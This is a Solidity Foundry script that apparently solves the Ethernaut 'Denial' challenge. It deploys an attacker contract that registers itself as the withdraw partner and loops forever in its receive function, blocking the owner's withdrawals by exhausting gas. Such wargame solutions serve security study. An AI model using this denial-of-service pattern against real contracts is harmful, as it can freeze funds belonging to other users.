// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Denial } from "../src/Denial.sol";

contract Attacker {

	Denial public instance = Denial(payable(0x0A249b5Fd7A895349cF5057d3dF79D0CC5cdB8C4));

    function attack() external {
        instance.setWithdrawPartner(address(this));
    }

    receive () external payable {
        while (true) {}
    }

}

contract DenialSolver is Script {
	
	Denial public instance = Denial(payable(0x0A249b5Fd7A895349cF5057d3dF79D0CC5cdB8C4));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        Attacker attacker = new Attacker();
        attacker.attack();

		vm.stopBroadcast();


	}

}
